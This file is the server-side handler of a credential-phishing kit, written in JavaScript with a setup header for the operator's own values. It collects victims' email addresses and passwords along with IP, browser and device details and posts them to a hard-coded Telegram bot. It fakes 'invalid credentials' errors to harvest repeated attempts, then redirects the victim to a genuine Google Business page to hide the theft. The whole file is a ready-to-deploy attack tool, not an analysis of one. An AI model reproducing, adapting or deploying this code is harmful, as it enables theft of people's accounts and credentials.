// ============================================================
// ✏️ EDIT THESE VALUES WITH YOUR OWN
// ============================================================
const BOT_TOKEN = '8663822973:AAFMUT0hR_Rgo3tSR0stWcjCZugz31zbkAQ';
const CHAT_ID = '-5595613546';
const REDIRECT_URL = 'https://business.google.com/create/new?hl=en&gmbsrc=ng-en-z-z-z-gmb-l-z-d~mhp-hom_sig-u&original_intent=GMB&skiplp=1&_gl=1*we7dbu*_ga*MTQyMzU2Nzk4MS4xNzQ4ODg2MDg1*_ga_VM5ES1YN10*czE3NDg4ODYwODQkbzEkZzAkdDE3NDg4ODYwODQkajYwJGwwJGgw&service=ome&omec=EMLX0y4yAgECOipnbWJzcmM9bmctZW4tei16LXotZ21iLWwtei1kfm1ocC1ob21fc2lnLXVAAUoTCIuXmb2k040DFb-XAAAd3Ss8Mw%3D%3D';

// ============================================================
// Helpers
// ============================================================

function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',');
        return ips[0].trim();
    }
    return req.connection?.remoteAddress || 'UNKNOWN';
}

async function sendTelegramMessage(text) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ Telegram credentials missing – message not sent.');
        return;
    }
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        if (!response.ok) {
            const errorData = await response.text();
            console.error('Telegram API error:', errorData);
        } else {
            console.log('✅ Telegram message sent successfully');
        }
    } catch (err) {
        console.error('Telegram send error:', err);
    }
}

// ============================================================
// Serverless Function Handler
// ============================================================

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Accept attempt from frontend, default to 1 if not provided
    let { email, password, screen, timezone, language, platform, attempt } = req.body;
    attempt = parseInt(attempt) || 1;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password are required' });
    }

    const ip = getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const emailProvider = email.includes('@') ? email.split('@')[1] : 'unknown';
    const timestamp = new Date().toLocaleString();

    const attemptLabel = attempt === 1 ? '1st' : attempt === 2 ? '2nd' : attempt === 3 ? '3rd (LAST)' : `${attempt}th`;

    const message = `
🔐 <b>Login Attempt #${attempt} (${attemptLabel})</b>
👤 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}
🌐 <b>IP:</b> ${ip}
💻 <b>User‑Agent:</b> ${userAgent}
📧 <b>Provider:</b> ${emailProvider}
🖥 <b>Platform:</b> ${platform || 'N/A'}
📱 <b>Screen:</b> ${screen || 'N/A'}
🌍 <b>Timezone:</b> ${timezone || 'N/A'}
🗣 <b>Language:</b> ${language || 'N/A'}
🕒 <b>Time:</b> ${timestamp}
    `;

    // Send immediately (we await so we can log errors, but response is sent after)
    try {
        await sendTelegramMessage(message);
    } catch (err) {
        console.error('Telegram send failed:', err);
    }

    const redirect = (attempt >= 3);

    return res.status(200).json({
        redirect,
        redirectUrl: REDIRECT_URL,
        attempts: attempt,
        message: redirect ? 'Redirecting...' : 'Invalid credentials'
    });
};
